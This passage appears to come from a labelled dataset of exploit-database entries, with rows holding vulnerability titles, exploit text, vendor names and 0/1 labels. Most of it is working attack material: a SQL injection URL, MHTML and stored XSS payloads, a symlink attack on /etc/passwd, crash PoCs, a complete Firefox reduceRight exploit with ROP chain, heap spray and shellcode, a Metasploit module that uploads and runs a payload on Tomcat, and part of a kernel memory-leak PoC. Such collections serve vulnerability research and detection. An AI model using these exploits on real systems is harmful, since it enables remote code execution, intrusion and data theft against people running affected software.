http://localhost/ferretCMS/admin.php?type=uploader&action=upload  Any unauthenticated user can execute/read those files that had been uploaded by visiting the following URL:  http://{TARGET}/custom/uploads/{NAME_OF_THE_UPLOADED_FILE}   ========= Solution: =========  Vendor responded, issues will be patched eventually.   ==================== Disclosure Timeline: ==================== 15/16-Jan-2015 – found the vulnerability 16-Jan-2015 - informed the developers (see [3]) 16-Jan-2015 – release date of this security advisory [without technical details] 21-Jan-2015 - attempt #2 to inform the developer via mail 22-Jan-2015 - vendor responded, technical details posted to Github (see [3]) 22-Jan-2015 - release date of this security advisory 22-Jan-2015 - send to lists   ======== Credits: ========  Vulnerability found and advisory written by Steffen Rösemann.  =========== References: ===========  [1] https://github.com/JRogaishio/ferretCMS [2] http://sroesemann.blogspot.de/2015/01/sroeadv-2015-10.html [3] https://github.com/JRogaishio/ferretCMS/issues/63 [4] https://github.com/sroesemann/ferretCMS",ferretcms_project,1
20770,"GoAhead Web Server 2.1 (Windows) - Denial of Service source: https://www.securityfocus.com/bid/2607/info  The GoAhead Web Server is a freely available, open source software package developed by GoAhead. The GoAhead Web Server offers a multi-platform web server and source code to the community.  A problem with the web server makes it possible to deny service to legitmate users of the software package. By accessing the web server, and issuing a request for the /aux directory, the web server ceases functioning. The process has to be manually restarted to resume normal operation.  Therefore, it is possible for a remote user to deny service to legitimate users of the web server.   telnet web.server 80 GET /aux then hit return twice",goahead,1
9094,"EasyVillaRentalSite - 'id' SQL Injection ========================================================  ==> EasyVillaRentalSite (id) Remote SQL Injection Vulnerability  ========================================================  ==> AuThOr : BazOka-HaCkEr  ==> EmaiL    : wuo@hotmail.com  ==> HomE    :  www.TrYaG.cc/cc  ========================================================  ==> Product Page :  ==> http://easyvillarentalsite.com  ==> ExplO!te :  ==> show_category.php?Id=-2/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,concat_ws(0x3a,user(),0x3a,database(),0x3a,version())--   ==> L!ve D3mo :  ==> http://easyvillarentalsite.com/demo/show_category.php?Id=-2/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,concat_ws(0x3a,user(),0x3a,database(),0x3a,version())--  =========================================================  ==> GreeTz :  ==> FeezO , Abu-Mahdi , MoGaTiL , Str0ke , TrYaG TeaM  =========================================================  # milw0rm.com [2009-07-09]",.TrYaG.cccc,0
9871,"Boloto Media Player 1.0.0.9 - '.pls' File Denial of Service ############################################################################# # # Boloto Media Player 1.0.0.9 Local (.PLS) Crash PoC # Found By:	Dr_IDE # Download:	http://www.tucows.com/preview/602821 # Tested On:	XPSP3 # Note:		It locks hard if you add this file to the playlist and click. # #############################################################################  buff = (""\x41"" * 5000)  try: 	f1 = open(""evil.pls"",""w""); 	f1.write(""[playlist]\nNumberOfFiles=3\n\nFile1=http://"" + buff); 	f1.close();  except: 	print (""[-] Error. File couldn't be created."");   #[pocoftheday.blogspot.com]",.tucows.,0
45867,"Webkit (Chome < 61) - 'MHTML' Universal Cross-site Scripting <?php $filename=realpath(""PoC.mht""); header( ""Content-type: multipart/related""); readfile($filename); ?>     MIME-Version: 1.0 Content-Type: multipart/related; 	type=""text/html""; 	boundary=""----MultipartBoundary--"" CVE-2017-5124  ------MultipartBoundary-- Content-Type: application/xml;  <?xml version=""1.0"" encoding=""UTF-8""?> <?xml-stylesheet type=""text/xml"" href=""#stylesheet""?> <!DOCTYPE catalog [ <!ATTLIST xsl:stylesheet id ID #REQUIRED> ]> <xsl:stylesheet id=""stylesheet"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform""> <xsl:template match=""*""> <html><iframe style=""display:none"" src=""https://google.com""></iframe></html> </xsl:template> </xsl:stylesheet>  ------MultipartBoundary-- Content-Type: text/html Content-Location: https://google.com  <script>alert('Location origin: '+location.origin)</script> ------MultipartBoundary----",.w3.,0
19229,IBM AIX eNetwork Firewall 3.2/3.3 - Insecure Temporary File Creation soure: https://www.securityfocus.com/bid/287/info  IBM's eNetwork Firewall for AIX contains a number of vulnerability in scripts which manipulate files insecurely. When fwlsuser script is run it creates a temporary file called /tmp/fwlsuser.PID ( where PID is the process ID of the command being run ). If this file is created previously and is a link to any other file the output generated by the fwlsuser script will overwrite this linked file.   x = 5000 while true  LOCAL FIX AS REPORTED BY ORIGINATOR: ln -s /etc/passwd /tmp/fwlsuser.$x # rm /tmp/fwlsuser.$x let x=$x+1 echo $x done exit,IBM,1
18531,"Mozilla Firefox 4.0.1 - 'Array.reduceRight()' Remote Overflow <!--  Full Exploit Code: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/18531.zip  PoC exploit for CVE-2011-2371  tested against Firefox 4.0.1 md5 of mozjs.dll: 5d7ffcc9deb5bb08417ceae51d2afed4  change constants to switch between w7/xp. see my blog if you want to know how this works. http://gdtr.wordpress.com/2012/02/22/exploiting-cve-2011-2371-without-non-aslr-modules/  p_k twitter.com/pa_kt gdtr.wordpress.com -->  <html>     <script src=""jspack.js""></script>     <script>           function hex(x){         var y = x.toString(16);         y = ""0x""+y;         return y;     }      function itoa(i)     {         return String.fromCharCode(i);     }          // n - length in bytes (1 unicode char = 2 bytes)     function puff(x, n){         while(x.length < n) x += x;          return x.substring(0,n);     }                function arr2hex(tab){           var s = """";           for(var i in tab){               x = tab[i];               x = x.toString(16);               if(x.length<2)                 x = ""0""+x;               s += x + "" "";             }             return s;         }          function arr2ascii(tab){             var s = """"             for(var i in tab){                 x = tab[i];                 if(0x20 <= x && x<=0x7f){                     y = itoa(x);                 }                 else{                     y = ""."";                 }                 s += y;             }             return s;         }      function xchg(d,i,j){         t = d[i];         d[i] = d[j];         d[j] = t;     }      function bswap(d){         xchg(d, 0, 3);         xchg(d, 1, 2);     }          function nicer(tab){           jsp = new JSPack();           res = [];           for(var i in tab){               x = tab[i];               t = jsp.Pack(""d"", [x]);               d1 = t.slice(0, 4);               d2 = t.slice(4, 8);               bswap(d1);               bswap(d2);               t = [d1,d2];                res = res.concat(t);           }           res = res.reverse();           return res;     }      function dw2int(d){         n = 0;         for(var i=0;i<4;i++){             n *= 256;             n += d[3-i];         }         return n;     }            function convert(tab){            o = s = v = """";           for(var i in tab){               d = tab[i];               s += arr2hex(d);               v += arr2ascii(d);               if((parseInt(i)+1)%4==0){                   o += s + "" | "" + v + ""\n"";                   s = """";                   v = """";               }           }           return o;       }      function check_pair(d1, d2){         var n1 = dw2int(d1);         var n2 = dw2int(d2);          if(n2-n1 == 0x304)             return true;         return false;     }      function find_mozjs_base(tab){         var n1 = 0;         for(var i=0;i<tab.length-4;i++){             d1 = tab[i];             d2 = tab[i+1];             if(check_pair(d1,d2)){                 n1 = dw2int(d1);                 n1 = n1 - 0x3cac;   //n1 = mozjs .data                 n1 = n1 - 0x1B2000; //n1 = mozjs base                 break;             }         }          return n1;     }      function d2u(dword){         var uni = String.fromCharCode(dword & 0xFFFF);         uni += String.fromCharCode(dword>>16);         return uni;     }      function odd_d2u(d1, d2){ 		uni = String.fromCharCode((d1&0xFF)<<8); 		uni += String.fromCharCode((d1>>8)&0xFFFF);         uni += String.fromCharCode((d1>>24)+((d2 & 0xFF)<<8)); //1+1<<8 == 512 in JS T_T 		uni += String.fromCharCode((d2>>8)&0xFFFF);         uni += String.fromCharCode(d2>>24);         return uni;     }      // generated with mona.py     function rop_chain(mozjs_base){         var arr = [             mozjs_base + 0x000c96e6,	// POP EAX // RETN [mozjs.dll]              mozjs_base + 0x0015d054,	// ptr to &VirtualAlloc() [IAT mozjs.dll]             mozjs_base + 0x00028510,	// MOV EAX,DWORD PTR DS:[EAX] // RETN [mozjs.dll]              mozjs_base + 0x0014293c,	// XCHG EAX,ESI // RETN [mozjs.dll]              mozjs_base + 0x0014d00d,	// POP EBP // RETN [mozjs.dll]              mozjs_base + 0x000d7ee2,	// & push esp //  ret 04 [mozjs.dll]             mozjs_base + 0x000be327,	// POP EBX // RETN [mozjs.dll]              0x00000001,                 	// 0x00000001-> ebx             mozjs_base + 0x0004f422,	// POP EDX // RETN [mozjs.dll]              0x00001000,                 	// 0x00001000-> edx             mozjs_base + 0x000b1421,	// POP ECX // RETN [mozjs.dll]              0x00000040,                 	// 0x00000040-> ecx             mozjs_base + 0x000062e3,	// POP EDI // RETN [mozjs.dll]              mozjs_base + 0x0000f005,	// RETN (ROP NOP) [mozjs.dll]             mozjs_base + 0x000652f0,	// POP EAX // RETN [mozjs.dll]              0x90909090,                 	// nop             mozjs_base + 0x001372bd 	// PUSHAD // RETN [mozjs.dll]              ];         return arr;     }          function tab2uni(tab){         var uni = """"         for(var i=0;i<tab.length;i++){             uni += d2u(tab[i]);         }         return uni;     }      function spray(mozjs_base, h1_s, hsize) {          function rva2va(addr) { return addr+mozjs_base; }         function rva2d(addr) { return d2u(rva2va(addr)); }                  var align = 0x100000;         var tab_offset = 0x1000;         var TYPE_OBJECT = ""%u0007%uffff"";         var pivot_rva = 0x1a21c;        // 0x68e7a21c :  # ADD EBP,EBX # PUSH DS # POP EDI # POP ESI # POP EBX # MOV ESP,EBP # POP EBP # RETN          var mov_esp_ebp_rva = 0x1a222;	// mov esp, ebp # pop ebp # ret          var h2_s = h1_s + hsize;         var h2_middle = (h2_s + hsize/2) & (~(align-1)); //align          //mov     eax,dword ptr [edi+64h]   ;edi=[h2_ptr+4], later: call eax          var h2_ptr = h2_middle + tab_offset;         var off1 = h2_ptr;         var off2 = h2_ptr-0x64;         var v1 = d2u(off1);         var h1_fill = unescape(v1+TYPE_OBJECT);         var foo = puff(h1_fill, 0x4000);         var h1_spray = foo.substring(0,(0x4000/2)-2);                  var pivot_va = rva2va(pivot_rva);         pivot_va = d2u(pivot_va);         off2 = d2u(off2);         var new_ebp = h2_ptr+18;         var mov_esp_ebp_va = rva2va(mov_esp_ebp_rva);         var set_esp = odd_d2u(new_ebp, mov_esp_ebp_va);          var rop = tab2uni(rop_chain(mozjs_base));          //shellcode by skylined         var msgbox_shellcode = ""%uf631%u6456%u768b%u8b30%u0c76%u768b%u8b1c%u086e%u368b%u5d8b%u8b3c%u1d5c%u0178%u8beb%u184b%ue367%u8bec%u207b%uef01%u7c8b%ufc8f%uef01%uc031%u3299%u6617%ucac1%uae01%uf775%u8166%u2afa%u74b6%u6609%ufa81%u1aaa%udbe0%uc575%u538b%u0124%u0fea%u14b7%u8b4a%u1c7b%uef01%u2c03%u8597%u74f6%u6812%u3233%u2020%u7568%u6573%u5472%ud5ff%u3195%uebf6%u56a3%u3168%u0021%u6800%u322d%u3733%u3268%u3130%u6831%u7663%u2d65%u8754%u2404%u5050%uff56%uccd5"";          var x = unescape(pivot_va+off2+set_esp+""%u1111%u2222""+rop+msgbox_shellcode);         x = puff(x, 0x4000);         var h2_spray = x.substring(0,(0x4000/2)-2);          var spray_tab = new Array();         for (i=0;i<0x1000;i++){             spray_tab[i] = h1_spray+""1"";             spray_tab[i].indexOf(""zzz"");         }         for (i=0x1000;i<0x2000;i++){             spray_tab[i] = h2_spray+""2"";             spray_tab[i].indexOf(""zzz"");         }     }      var exploit_func =          function bleh(prev, current, index, array) {             //boom = typeof current;             current[4] = 1; // add ebp, ebx, where ebx=2*4+1=9             //throw ""up"";          }      function trigger(func, arr_len){         xyz.length = arr_len;         try{           xyz.reduceRight(func,1,2,3);         }         catch(e){ }     }      function leak(){         var CHUNK_SIZE = 0x1000;         var leak_arr_len = 0xffffffff;          mem = [];         count = 0;          var leak_func =              function bleh(prev, current, index, array) {                 if(typeof current == ""number""){                     mem.push(current);                 }                 count += 1;                 if(count>=CHUNK_SIZE/8){                     throw ""lol"";                 }         }          function dump_mem(leak_f, arr_len){             var dump = document.getElementById(""dump"");             var mozjs_base = 0;             for(var i=0;;i++){                 mem = [];                 count = 0;                 trigger(leak_f, arr_len);                 mem = nicer(mem);                 s = convert(mem);                 dump.innerHTML = s;                  //alert(""leaked bytes: ""+hex(mem.length*4));                 mozjs_base = find_mozjs_base(mem);                 //alert(""mozjs base: ""+hex(mozjs_base));                 if(mozjs_base != 0){                   break;                 }             }             return mozjs_base;         }         var base = dump_mem(leak_func, leak_arr_len);         return base;     }      function go(){         //var arr_ptr = 0x05000000; //(xp sp3)         //var h1_s = 0x05b00000;          //var h2_e = 0x0fb00000;          var arr_ptr = 0x0b000000; //w7         var h1_s = 0x0b500000;          var h2_e = 0x16e00000;          var size = h2_e-h1_s;         var hsize = size/2;          var h1_middle = h1_s+hsize/2;         var exp_arr_len = (h1_middle - arr_ptr)/8 + 0x80000000;          var mozjs_base = leak();         spray(mozjs_base, h1_s, hsize);          alert(""ready""); 	         while(1){             trigger(exploit_func, exp_arr_len);             exp_arr_len -= 0x500;         }     }      // globals     var xyz = new Array();      </script>      <body>         <input type=""button"" value=""go"" onclick=""go()"" />         <pre id=""dump"">         </pre>     </body>   </html>",Mozilla,1
43947,"IPSwitch MOVEit 8.1 < 9.4 - Cross-Site Scripting # Exploit Title: IPSwitch MoveIt Stored Cross Site Scripting (XSS) # Date: 1-31-2017 # Software Link: https://www.ipswitch.com/moveit # Affected Version: 8.1-9.4 (only confirmed on 8.1 but other versions prior to 9.5 may also be vulnerable) # Exploit Author: 1N3@CrowdShield - https://crowdshield.com (Early Warning Security) # Contact: https://twitter.com/crowdshield # Vendor Homepage: https://www.ipswitch.com  # Category: Webapps # Attack Type: Remote # Impact: Data/Cookie Theft    1. Description   IPSwitch MoveIt v8.1 is vulnerable to a Stored Cross-Site Scripting (XSS) vulnerability. Attackers can leverage this vulnerability to send malicious messages to other users in order to steal session cookies and launch client-side attacks.    2. Proof of Concept  The vulnerability lies in the Send Message -> Body Text Area input field.   POST /human.aspx?r=692492538 HTTP/1.1 Host: host.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Referer: https://host.com/human.aspx?r=510324925 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 598  czf=9c9e7b2a9c9e7b2a9c9e7b2a9c9e7b2a9c066e4aee81bf97f581826d8c093953d82d2b692be5490ece13e6b23f1ad09bda751db1444981eb029d2427175f9906&server=host.com&url=%2Fhuman.aspx&instid=2784&customwizlogoenabled=0&customwiznameup=&customwizzipnameup=%5Bdefault%5D&transaction=secmsgpost&csrftoken=1a9cc0f7aa7ee2d9e0059d6b01da48b69a14669d&curuser=kuxt36r50uhg0sXX&arg12=secmsgcompose&Arg02=&Arg03=452565093&Arg05=edit&Arg07=forward&Arg09=&Arg10=&opt06=&Opt08=&opt01=username&opt02=&opt03=&arg01=FW%3A+test&Opt12=1&arg04=<iframe/src=javascript:alert(1)>&attachment=&opt07=1&arg05_Send=Send   3. Solution:  Update to version 9.5   4. Disclosure Timeline  1/30/2017 - Disclosed details of vulnerability to IPSwitch. 1/31/2017 - IPSwitch confirmed the vulnerability and verified the fix as of version 9.5 and approved public disclosure of the vulnerability.",.ipswitch.,1
4012,"LeadTools Raster OCR Document Object Library - Memory Corruption <pre> <span style=""font: 14pt Courier New;""><p align=""center""><b>2007/05/26</b></p></span> <code><span style=""font: 10pt Courier New;""><span class=""general1-symbol"">-----------------------------------------------------------------------------------------------------------  <b>LeadTools Raster OCR Document Object Library (ltrdc14e.dll v. 14.5.0.44) Remote Memory corruption Exploit</b>  url: http://www.leadtools.com/  price: eheheh, take a look at thier site :)   author: shinnai  mail: shinnai[at]autistici[dot]org  site: http://shinnai.altervista.org    Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7  all software that use this ocx are vulnerable to this exploits. -----------------------------------------------------------------------------------------------------------  <object classid='clsid:00140B30-B1BA-11CE-ABC6-F5B2E79D9E3F' id='test'></object>  <input language=VBScript onclick=tryMe() type=button value=""Click here to start the test"">  <script language='vbscript'>  Sub tryMe   buff = String(4000, ""A"")      test.DictionaryFileName = buff  End Sub </script> </span></span> </code></pre>  # milw0rm.com [2007-05-30]",.leadtools.,1
31433,"Apache Tomcat Manager - Application Upload (Authenticated) Code Execution (Metasploit) ## # This module requires Metasploit: http//metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = ExcellentRanking    HttpFingerprint = { :pattern => [ /Apache.*(Coyote|Tomcat)/ ] }    CSRF_VAR = 'CSRF_NONCE='    include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::EXE    def initialize(info = {})     super(update_info(info,       'Name'        => 'Apache Tomcat Manager Application Upload Authenticated Code Execution',       'Description' => %q{         This module can be used to execute a payload on Apache Tomcat servers that         have an exposed ""manager"" application. The payload is uploaded as a WAR archive         containing a jsp application using a POST request against the /manager/html/upload         component.          NOTE: The compatible payload sets vary based on the selected target. For         example, you must select the Windows target to use native Windows payloads.       },       'Author'      => 'rangercha',       'License'     => MSF_LICENSE,       'References'  =>         [           # This is based on jduck's tomcat_mgr_deploy.           # the tomcat_mgr_deploy o longer works for current versions of tomcat due to           # CSRF protection tokens. Also PUT requests against the /manager/html/deploy           # aren't allowed anymore.            # There is no single vulnerability associated with deployment functionality.           # Instead, the focus has been on insecure/blank/hardcoded default passwords.            #  The following references refer to HP Operations Manager           ['CVE', '2009-3843'],           ['OSVDB', '60317'],           ['CVE', '2009-4189'],           ['OSVDB', '60670'],            # HP Operations Dashboard           ['CVE', '2009-4188'],            # IBM Cognos Express Default user/pass           ['BID', '38084'],           ['CVE', '2010-0557'],           ['URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21419179'],            # IBM Rational Quality Manager and Test Lab Manager           ['CVE', '2010-4094'],           ['ZDI', '10-214'],            # 'admin' password is blank in default Windows installer           ['CVE', '2009-3548'],           ['OSVDB', '60176'],           ['BID', '36954'],            # tomcat docs           ['URL', 'http://tomcat.apache.org/tomcat-5.5-doc/manager-howto.html']         ],       'Platform'    => %w{ java linux win }, # others?       'Targets'     =>         [           [ 'Java Universal',             {               'Arch'     => ARCH_JAVA,               'Platform' => 'java'             }           ],           #           # Platform specific targets only           #           [ 'Windows Universal',             {               'Arch'     => ARCH_X86,               'Platform' => 'win'             }           ],           [ 'Linux x86',             {               'Arch'     => ARCH_X86,               'Platform' => 'linux'             }           ]         ],       'DefaultTarget'  => 0,       'DisclosureDate' => 'Nov 09 2009'))      register_options(       [         OptString.new('USERNAME', [false, 'The username to authenticate as']),         OptString.new('PASSWORD', [false, 'The password for the specified username']),         # /cognos_express/manager/ for Cognos Express (19300)         OptString.new('TARGETURI', [true, ""The URI path of the manager app (/html/upload and /undeploy will be used)"", '/manager'])       ], self.class)   end    def check     res = query_manager     disconnect      return CheckCode::Unknown if res.nil?      if res.code.between?(400, 499)       vprint_error(""#{peer} - Server rejected the credentials"")       return CheckCode::Unknown     end      return CheckCode::Safe unless res.code == 200      # if res.code == 200     #   there should be access to the Tomcat Manager and to the status page     res = query_status     return CheckCode::Unknown unless res      plat = detect_platform(res.body)     arch = detect_arch(res.body)     return CheckCode::Unknown unless plat and arch      vprint_status(""#{peer} - Tomcat Manager found running on #{plat} platform and #{arch} architecture"")      report_auth_info(       :host   => rhost,       :port   => rport,       :sname  => (ssl ? ""https"" : ""http""),       :user   => datastore['USERNAME'],       :pass   => datastore['PASSWORD'],       :proof  => ""WEBAPP=\""Tomcat Manager App\"", VHOST=#{vhost}, PATH=#{datastore['PATH']}"",       :active => true     )      return CheckCode::Appears   end    def exploit     @app_base = rand_text_alphanumeric(4 + rand(32 - 4))     @jsp_name = rand_text_alphanumeric(4 + rand(32 - 4))      #     # Find the session ID and the CSRF token     #     print_status(""#{peer} - Retrieving session ID and CSRF token..."")     unless access_manager?       fail_with(Failure::Unknown, ""Unable to access the Tomcat Manager"")     end      #     # Upload Payload     #     print_status(""#{peer} - Uploading and deploying #{@app_base}..."")     if upload_payload       report_auth_info(         :host   => rhost,         :port   => rport,         :sname  => (ssl ? ""https"" : ""http""),         :user   => datastore['USERNAME'],         :pass   => datastore['PASSWORD'],         :proof  => ""WEBAPP=\""Tomcat Manager App\"", VHOST=#{vhost}, PATH=#{datastore['PATH']}"",         :active => true       )     else       fail_with(Failure::Unknown, ""Upload failed"")     end      #     # Execute Payload     #     print_status(""#{peer} - Executing #{@app_base}..."")     unless execute_payload       fail_with(Failure::Unknown, ""Failed to execute the payload"")     end      #     # Get the new CSRF token & session id     #     unless access_manager?       fail_with(Failure::Unknown, ""Unable to access the Tomcat Manager"")     end      #     # Delete the deployed payload     #     print_status(""#{peer} - Undeploying #{@app_base} ..."")     unless undeploy_app       print_warning(""#{peer} - Failed to undeploy #{@app_base}..."")     end   end    def query_status     path = normalize_uri(target_uri.path.to_s, 'status')     res = send_request_raw('uri' => path)      unless res and res.code == 200       vprint_error(""Failed: Error requesting #{path}"")       return nil     end      return res   end    def query_manager     path = normalize_uri(target_uri.path.to_s, '/html')     res = send_request_raw('uri' => path)      return res   end    def vars_get     vars = {}     unless @csrf_token.nil?       vars = {         ""path"" => @app_base,         ""org.apache.catalina.filters.CSRF_NONCE"" => @csrf_token       }     end      return vars   end    def detect_platform(body)     return nil if body.blank?      i=0      body.each_line do |ln|       ln.chomp!        i = 1 if ln =~ /OS Name/        if i == 9 or i == 11         if ln.include? ""Windows""           return 'win'         elsif ln.include? ""Linux""           return 'linux'         elsif i==11           return 'unknown'         end       end        i = i+1 if i > 0     end   end    def detect_arch(body)     return nil if body.blank?      i=0     body.each_line do |ln|       ln.chomp!        i = 1 if ln =~ /OS Architecture/        if i==9 or i==11         if ln.include? 'x86'           return ARCH_X86         elsif ln.include? 'i386'           return ARCH_X86         elsif ln.include? 'i686'           return ARCH_X86         elsif ln.include? 'x86_64'           return ARCH_X86         elsif ln.include? 'amd64'           return ARCH_X86         elsif i==11           return 'unknown'         end       end        i = i + 1 if i > 0     end   end    def find_csrf(res = nil)     return """" if res.blank?      vprint_status(""#{peer} - Finding CSRF token..."")      body = res.body      body.each_line do |ln|       ln.chomp!       csrf_nonce = ln.index(CSRF_VAR)       next if csrf_nonce.nil?       token = ln[csrf_nonce + CSRF_VAR.length, 32]       return token     end      return """"   end    def generate_multipart_msg(boundary, data)     # Rex::MIME::Message is breaking the binary upload when trying to     # enforce CRLF for SMTP compatibility     war_multipart = ""-----------------------------""     war_multipart << boundary     war_multipart << ""\r\nContent-Disposition: form-data; name=\""deployWar\""; filename=\""""     war_multipart << @app_base     war_multipart << "".war\""\r\nContent-Type: application/octet-stream\r\n\r\n""     war_multipart << data     war_multipart << ""\r\n-----------------------------""     war_multipart << boundary     war_multipart << ""--\r\n""   end    def war_payload     payload.encoded_war({       :app_name => @app_base,       :jsp_name => @jsp_name,       :arch => target.arch,       :platform => target.platform     }).to_s   end    def send_war_payload(url, war)     boundary_identifier = rand_text_numeric(28)      res = send_request_cgi({       'uri'          => url,       'method'       => 'POST',       'ctype'        => 'multipart/form-data; boundary=---------------------------' + boundary_identifier,       'user'         => datastore['USERNAME'],       'password'     => datastore['PASSWORD'],       'cookie'       => @session_id,       'vars_get'     => vars_get,       'data'         => generate_multipart_msg(boundary_identifier, war),     })      return res   end    def send_request_undeploy(url)     res = send_request_cgi({       'uri'          => url,       'vars_get'     => vars_get,       'method'       => 'POST',       'user'         => datastore['USERNAME'],       'password'     => datastore['PASSWORD'],       'cookie'       => @session_id     })      return res   end    def access_manager?     res = query_manager     return false unless res and res.code == 200     @session_id = res.get_cookies     @csrf_token = find_csrf(res)     return true   end    def upload_payload     war = war_payload     upload_path = normalize_uri(target_uri.path.to_s, ""html"", ""upload"")     vprint_status(""#{peer} - Uploading #{war.length} bytes as #{@app_base}.war ..."")     res = send_war_payload(upload_path, war)     return parse_upload_response(res)   end    def parse_upload_response(res)     unless res       vprint_error(""#{peer} - Upload failed on #{upload_path} [No Response]"")       return false     end      if res.code < 200 or res.code >= 300       vprint_warning(""Warning: The web site asked for authentication: #{res.headers['WWW-Authenticate'] || res.headers['Authentication']}"") if res.code == 401       vprint_error(""Upload failed on #{upload_path} [#{res.code} #{res.message}]"")       return false     end      return true   end    def execute_payload     jsp_path = normalize_uri(@app_base, ""#{@jsp_name}.jsp"")      vprint_status(""#{peer} - Executing #{jsp_path}..."")      res = send_request_cgi({       'uri'          => jsp_path,       'method'       => 'GET'     })      return parse_execute_response(res)   end    def parse_execute_response(res)     unless res       vprint_error(""#{peer} - Execution failed on #{@app_base} [No Response]"")       return false     end      if res and (res.code < 200 or res.code >= 300)       vprint_error(""#{peer} - Execution failed on #{@app_base} [#{res.code} #{res.message}]"")       return false     end      return true   end    def undeploy_app     undeploy_url = normalize_uri(target_uri.path.to_s, ""html"", ""undeploy"")     res = send_request_undeploy(undeploy_url)      unless res       vprint_warning(""#{peer} - WARNING: Undeployment failed on #{undeploy_url} [No Response]"")       return false     end      if res and (res.code < 200 or res.code >= 300)       vprint_warning(""#{peer} - Deletion failed on #{undeploy_url} [#{res.code} #{res.message}]"")       return false     end      return true   end  end",-01.ibm.,0
42055,"Apple macOS/iOS Kernel - Memory Disclosure Due to Lack of Bounds Checking in netagent Socket Option Handling /* Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1140  netagent_ctl_setopt is the setsockopt handler for netagent control sockets. Options of type NETAGENT_OPTION_TYPE_REGISTER are handled by netagent_handle_register_setopt. Here's the code:    static errno_t   netagent_handle_register_setopt(struct netagent_session *session, u_int8_t *payload,                   u_int32_t payload_length)   {     int data_size = 0;     struct netagent_wrapper *new_wrapper = NULL;     u_int32_t response_error = 0;     struct netagent *register_netagent = (struct netagent *)(void *)payload;   <----------- (a)      if (session == NULL) {       NETAGENTLOG0(LOG_ERR, ""Failed to find session"");       response_error = EINVAL;       goto done;     }      if (payload == NULL) {       NETAGENTLOG0(LOG_ERR, ""No payload received"");       response_error = EINVAL;       goto done;     }      if (session->wrapper != NULL) {       NETAGENTLOG0(LOG_ERR, ""Session already has a registered agent"");       response_error = EINVAL;       goto done;     }      if (payload_length < sizeof(struct netagent)) {                              <----------- (b)       NETAGENTLOG(LOG_ERR, ""Register message size too small for agent: (%d < %d)"",             payload_length, sizeof(struct netagent));       response_error = EINVAL;       goto done;     }      data_size = register_netagent->netagent_data_size;     if (data_size < 0 || data_size > NETAGENT_MAX_DATA_SIZE) {                      <----------- (c)       NETAGENTLOG(LOG_ERR, ""Register message size could not be read, data_size %d"",             data_size);       response_error = EINVAL;       goto done;     }      MALLOC(new_wrapper, struct netagent_wrapper *, sizeof(*new_wrapper) + data_size, M_NETAGENT, M_WAITOK);     if (new_wrapper == NULL) {       NETAGENTLOG0(LOG_ERR, ""Failed to allocate agent"");       response_error = ENOMEM;       goto done;     }      memset(new_wrapper, 0, sizeof(*new_wrapper) + data_size);     memcpy(&new_wrapper->netagent, register_netagent, sizeof(struct netagent) + data_size);   <------------ (d)      response_error = netagent_handle_register_inner(session, new_wrapper);     if (response_error != 0) {       FREE(new_wrapper, M_NETAGENT);       goto done;     }      NETAGENTLOG0(LOG_DEBUG, ""Registered new agent"");     netagent_post_event(new_wrapper->netagent.netagent_uuid, KEV_NETAGENT_REGISTERED, TRUE);    done:     return response_error;   }   The payload and payload_length arguments are the socket option buffer which has be copied in to the kernel.  At (a) this is cast to a struct netagent and at (b) it's checked whether the payload is big enough to contain this structure. Then at (c) an int read from the buffer is compared against a lower and upper bound and then used at (d) as the size of data to copy from inside the payload buffer. It's not checked that the payload buffer is actually big enough to contain data_size bytes of data though.  This oob data can then be retreived by userspace via the SIOCGIFAGENTDATA64 ioctl. This poc will dump 4k of kernel heap.  Tested on MacOS 10.12.3 (16D32) on MacBookPro10,1 */  // ianbeer #if 0 iOS/MacOS kernel memory disclosure due to lack of bounds checking in netagent socket option handling  netagent_ctl_setopt is the setsockopt handler for netagent control sockets. Options of type NETAGENT_OPTION_TYPE_REGISTER are handled by netagent_handle_register_setopt. Here's the code:  	static errno_t 	netagent_handle_register_setopt(struct netagent_session *session, u_int8_t *payload, 									u_int32_t payload_length) 	{ 		int data_size = 0; 		struct netagent_wrapper *new_wrapper = NULL; 		u_int32_t response_error = 0; 		struct netagent *register_netagent = (struct netagent *)(void *)payload;   <----------- (a)  		if (session == NULL) { 			NETAGENTLOG0(LOG_ERR, ""Failed to find session""); 			response_error = EINVAL; 			goto done; 		}  		if (payload == NULL) { 			NETAGENTLOG0(LOG_ERR, ""No payload received""); 			response_error = EINVAL; 			goto done; 		}  		if (session->wrapper != NULL) { 			NETAGENTLOG0(LOG_ERR, ""Session already has a registered agent""); 			response_error = EINVAL; 			goto done; 		}  		if (payload_length < sizeof(struct netagent)) {                              <----------- (b) 			NETAGENTLOG(LOG_ERR, ""Register message size too small for agent: (%d < %d)"", 						payload_length, sizeof(struct netagent)); 			response_error = EINVAL; 			goto done; 		}  		data_size = register_netagent->netagent_data_size; 		if (data_size < 0 || data_size > NETAGENT_MAX_DATA_SIZE) {                      <----------- (c) 			NETAGENTLOG(LOG_ERR, ""Register message size could not be read, data_size %d"", 						data_size); 			response_error = EINVAL; 			goto done; 		}  		MALLOC(new_wrapper, struct netagent_wrapper *, sizeof(*new_wrapper) + data_size, M_NETAGENT, M_WAITOK); 		if (new_wrapper == NULL) { 			NETAGENTLOG0(LOG_ERR, ""Failed to allocate agent""); 			response_error = ENOMEM; 			goto done; 		}  		memset(new_wrapper, 0, sizeof(*new_wrapper) + data_size); 		memcpy(&new_wrapper->netagent, register_netagent, sizeof(struct netagent) + data_size);   <------------ (d)  		response_error = netagent_handle_register_inner(session, new_wrapper); 		if (response_error != 0) { 			FREE(new_wrapper, M_NETAGENT); 			goto done; 		}  		NETAGENTLOG0(LOG_DEBUG, ""Registered new agent""); 		netagent_post_event(new_wrapper->netagent.netagent_uuid, KEV_NETAGENT_REGISTERED, TRUE);  	done: 		return response_error; 	}   The payload and payload_length arguments are the socket option buffer which has be copied in 